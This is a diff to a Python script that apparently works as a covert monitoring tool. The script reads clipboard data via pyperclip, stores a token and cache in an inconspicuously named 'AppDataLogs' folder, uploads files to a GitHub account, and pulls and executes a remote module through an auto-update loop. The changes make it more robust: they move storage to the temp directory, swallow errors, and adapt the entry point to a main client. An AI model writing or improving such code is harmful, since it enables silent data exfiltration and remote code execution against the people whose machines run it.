@@ -4,6 +4,7 @@ import os
 import re
 import socket
 import sys
+import tempfile
 import threading
 import time
 import subprocess
@@ -13,9 +14,16 @@ import pyperclip
 import requests
 
 DEVICE_NAME = socket.gethostname()
-SAVE_DIR = r"D:\AppDataLogs\Cache"
-TOKEN_FILE_PATH = r"D:\AppDataLogs\token.txt"
-os.makedirs(SAVE_DIR, exist_ok=True)
+
+# 使用系统通用临时目录，避免无 D 盘或权限不足引发崩溃
+BASE_DIR = os.path.join(tempfile.gettempdir(), "AppDataLogs")
+SAVE_DIR = os.path.join(BASE_DIR, "Cache")
+TOKEN_FILE_PATH = os.path.join(BASE_DIR, "token.txt")
+
+try:
+    os.makedirs(SAVE_DIR, exist_ok=True)
+except Exception:
+    pass
 
 GITHUB_CONFIG = {
     "username": "Bei18",
@@ -82,7 +90,7 @@ def upload_file_smart(file_path):
 
     token = get_active_token()
     if not token:
-        write_txt("同步失败", "未找到有效 Token，请在 D:\\AppDataLogs\\token.txt 中写入 Token")
+        write_txt("同步失败", f"未找到有效 Token，请检查 Token 路径: {TOKEN_FILE_PATH}")
         return False
 
     file_name = os.path.basename(file_path)
@@ -237,8 +245,10 @@ def auto_update_loop(token):
                 write_txt("系统", "正在重载新版模块...")
 
                 for listener in running_listeners:
-                    try: listener.stop()
-                    except Exception: pass
+                    try:
+                        listener.stop()
+                    except Exception:
+                        pass
                 running_listeners.clear()
 
                 spec = importlib.util.spec_from_file_location("remote_main", cache_path)
@@ -251,8 +261,18 @@ def auto_update_loop(token):
             write_txt("系统", f"远端更新检查失败: {e}")
 
 
-def run(token=None):
+def run(*args, **kwargs):
+    """
+    修改为支持可变参数结构，适配主客户端调用: remote_module.run(token)
+    """
     kill_previous_instances()
+
+    # 提取位置参数或关键字参数中的 Token
+    token = None
+    if args:
+        token = args[0]
+    elif "token" in kwargs:
+        token = kwargs["token"]
 
     if token:
         GITHUB_CONFIG["token"] = token
